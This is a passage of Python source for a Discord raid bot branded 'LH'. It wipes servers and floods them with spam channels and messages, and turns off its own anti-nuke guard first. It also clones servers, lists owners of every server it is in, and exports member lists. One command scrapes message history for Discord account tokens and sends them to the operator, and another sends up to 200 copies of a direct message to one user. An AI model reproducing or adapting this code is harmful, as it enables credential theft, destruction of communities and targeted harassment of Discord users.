        try: await ctx.message.delete()
        except Exception: pass

        status = await ctx.send(f"🔄 Cloning **{source_guild.name}** → **{target_guild.name}**...")
        await clone_server(source_guild, target_guild)
        try: await status.delete()
        except Exception: pass

        embed = discord.Embed(title="✅ Server Clone Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
        embed.add_field(name="Source", value=f"{source_guild.name} (`{source_guild.id}`)", inline=False)
        embed.add_field(name="Target", value=f"{target_guild.name} (`{target_guild.id}`)", inline=False)
        embed.add_field(name="Cloned", value=f"{len(source_guild.roles)} roles, {len(source_guild.channels)} channels", inline=False)
        try: await ctx.author.send(embed=embed)
        except Exception: await ctx.send(embed=embed, delete_after=15)
        return

    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    antinuke_enabled[ctx.guild.id] = False
    await run_nuke(ctx.guild)


# ══════════════════════════════════════════════════════════════
#  LHP
# ══════════════════════════════════════════════════════════════

class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
    token_input        = discord.ui.TextInput(label="Premium Token",               placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx", required=True, max_length=32,   style=discord.TextStyle.short)
    channel_name_input = discord.ui.TextInput(label="Channel Name",                placeholder="hooked by lh clan",           required=True, max_length=100,  style=discord.TextStyle.short)
    message_input      = discord.ui.TextInput(label="Spam Message",                placeholder="lol ur server...",            required=True, max_length=2000, style=discord.TextStyle.paragraph)
    channel_count_input= discord.ui.TextInput(label="Channel Count (min 12)",      placeholder="12",                          required=True, max_length=3,    style=discord.TextStyle.short)
    spam_count_input   = discord.ui.TextInput(label="Spam Count per Channel (max 200)", placeholder="100",                    required=True, max_length=3,    style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tok = self.token_input.value.strip()
        valid, reason = _peek_token(tok)
        if not valid:
            await interaction.followup.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), ephemeral=True); return
        try:
            ch_count = max(12, int(self.channel_count_input.value.strip()))
            sp_count = max(1, min(int(self.spam_count_input.value.strip()), 200))
        except ValueError:
            await interaction.followup.send("❌ Counts must be numbers.", ephemeral=True); return
        nuke_config["channel_name"]  = self.channel_name_input.value.strip()
        nuke_config["message"]       = self.message_input.value.strip()
        nuke_config["channel_count"] = ch_count
        nuke_config["spam_count"]    = sp_count
        validate_token(tok)
        preview = nuke_config['message'][:100] + "..." if len(nuke_config['message']) > 100 else nuke_config['message']
        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
        embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`", inline=False)
        embed.add_field(name="Spam Message",  value=f"`{preview}`",                     inline=False)
        embed.add_field(name="Channel Count", value=str(ch_count),                      inline=True)
        embed.add_field(name="Spam Count",    value=str(sp_count),                      inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.followup.send("❌ Something broke. Try again.", ephemeral=True)


@bot.command(name="LHP")
async def lhp(ctx):
    try: await ctx.message.delete()
    except Exception: pass

    class LHPView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)

        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message("❌ Only the command runner can use this.", ephemeral=True); return
            await interaction.response.send_modal(LHPModal())
            self.stop()

    msg = await ctx.send(embed=discord.Embed(title="⚙️ LH Premium Config", description="Click to open.\nRequires a valid token.", color=0xffd700), view=LHPView())
    await asyncio.sleep(61)
    try: await msg.delete()
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  INTEL
# ══════════════════════════════════════════════════════════════

@bot.command(name="LHSPY")
async def lh_spy(ctx):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    guilds = bot.guilds
    if not guilds:
        await ctx.author.send("Bot is not in any servers."); return
    for idx, page in enumerate([guilds[i:i+10] for i in range(0, len(guilds), 10)]):
        embed = discord.Embed(title=f"📡 Server Spy — Page {idx+1}", color=0xff4400, timestamp=discord.utils.utcnow())
        for g in page:
            try: owner = await bot.fetch_user(g.owner_id); owner_str = f"{owner} (`{owner.id}`)"
            except Exception: owner_str = f"ID: `{g.owner_id}`"
            embed.add_field(name=g.name, value=f"ID: `{g.id}`\nMembers: `{g.member_count}`\nOwner: {owner_str}\nAntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}", inline=True)
        embed.set_footer(text=f"Total: {len(guilds)} servers")
        try: await ctx.author.send(embed=embed)
        except discord.Forbidden: await ctx.send(embed=embed, delete_after=30)
    await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)


@bot.command(name="LHMEMBERS")
async def lh_members(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHMEMBERS <serverID>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    await ctx.send("📋 Fetching...", delete_after=5)
    lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
    async for member in guild.fetch_members(limit=None):
        lines.append(f"Username : {member}\nID       : {member.id}\nTop Role : {member.top_role.name}\nJoined   : {member.joined_at.strftime('%Y-%m-%d') if member.joined_at else 'unknown'}\nBot      : {'Yes' if member.bot else 'No'}\n{'-'*40}")
    file_path = f"/tmp/members_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(lines))
    try:
        await ctx.author.send(content=f"📋 Member list for **{guild.name}**", file=discord.File(file_path, filename=f"members_{guild.name}.txt"))
        await ctx.send("📋 Sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"members_{guild.name}.txt"))


@bot.command(name="LHTOKENS")
async def lh_tokens_cmd(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHTOKENS <serverID>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    status = await ctx.send("🔍 Scanning...")
    found  = []
    for channel in guild.text_channels:
        try:
            async for msg in channel.history(limit=500):
                for match in DISCORD_TOKEN_REGEX.findall(msg.content):
                    found.append(f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\nChannel: #{channel.name}\n{'─'*40}")
        except Exception: continue
    try: await status.delete()
    except Exception: pass
    if not found:
        try: await ctx.author.send(f"🔍 Scan complete for **{guild.name}** — no tokens found.")
        except Exception: await ctx.send("🔍 No tokens found.", delete_after=10)
        return
    output = f"Token Scan — {guild.name}\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
    file_path = f"/tmp/tokens_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write(output)
    try:
        await ctx.author.send(content=f"🔑 Found **{len(found)}** token(s)", file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))


# ══════════════════════════════════════════════════════════════
#  DM + INFO
# ══════════════════════════════════════════════════════════════

@bot.tree.command(name="dm", description="DM a user by @mention or ID")
@app_commands.describe(member="@mention a server member", user_id="Or paste a user ID", message="Message to send", count="How many times (max 200)", delay="Delay in seconds between messages")
async def dm(interaction: discord.Interaction, message: str, count: app_commands.Range[int, 1, 200], member: Optional[discord.Member] = None, user_id: Optional[str] = None, delay: Optional[float] = None):
    await interaction.response.defer(ephemeral=True)
    actual_delay = max(0.0, min(delay or 0.0, 10.0))
    if member: user = member
    elif user_id:
        try: user = await bot.fetch_user(int(user_id))
        except discord.NotFound:
            await interaction.followup.send("❌ User not found.", ephemeral=True); return
        except ValueError:
            await interaction.followup.send("❌ Invalid ID.", ephemeral=True); return
    else:
        await interaction.followup.send("❌ Provide a @mention or user ID.", ephemeral=True); return
    success = 0; failed = 0
    for _ in range(count):
        try:
            await user.send(message); success += 1
            if actual_delay > 0: await asyncio.sleep(actual_delay)
        except discord.Forbidden:
            failed = count - success; break
        except discord.HTTPException:
            failed += 1
    color = 0x00ff00 if failed == 0 else (0xff0000 if success == 0 else 0xff9900)
    embed = discord.Embed(title="📬 DM Report", color=color)
    embed.add_field(name="Target",       value=f"{user} (`{user.id}`)", inline=False)
    embed.add_field(name="✅ Sent",      value=str(success),            inline=True)
    embed.add_field(name="❌ Failed",    value=str(failed),             inline=True)
    embed.add_field(name="📨 Requested", value=str(count),             inline=True)
    embed.set_footer(text=f"Requested by {interaction.user}")
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="serverinfo", description="Show server info")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=g.icon.url if g.icon else None)
    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="userinfo", description="Show info about a user")
@app_commands.describe(member="User to inspect")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="poll", description="Create a yes/no poll")
@app_commands.describe(question="What to ask")
async def poll(interaction: discord.Interaction, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
    embed.set_footer(text=f"Asked by {interaction.user}")
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
    await interaction.response.send_message(embed=discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color), ephemeral=True)


# ══════════════════════════════════════════════════════════════
#  LOG TEST
# ══════════════════════════════════════════════════════════════

@bot.command(name="logtest")
async def logtest(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(
        title="🔔 Log Test",
        description="Webhook logging is working correctly.",
        color=0x00ff00,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name="Webhook URL", value=f"`{LOG_WEBHOOK_URL[:40]}...`" if LOG_WEBHOOK_URL else "❌ Not configured", inline=False)
    embed.set_footer(text="LH Logging System")
    await notify_owner(embed)
    if LOG_WEBHOOK_URL:
        await ctx.send("✅ Test alert sent to webhook + DM.", delete_after=5)
    else:
        await ctx.send("⚠️ No `LOG_WEBHOOK_URL` set — alert sent to DM only. Add it in Railway Variables.", delete_after=10)


# ══════════════════════════════════════════════════════════════
#  SETUP HOOK — persistent views
# ══════════════════════════════════════════════════════════════

async def setup_hook():
    bot.add_view(VerifyButton())
    bot.add_view(HelpView())
    # TunnelMessageView is not registered globally here because
    # each tunnel has a different target_id — fresh instances are
    # sent with each !dmt / !dmtreply call, which is correct.
    # Discord re-resolves the custom_id "tunnel_reply" through
    # whichever TunnelMessageView instance is sent with the message.

bot.setup_hook = setup_hook

# ── run ───────────────────────────────────────────────────────
bot.run(TOKEN)
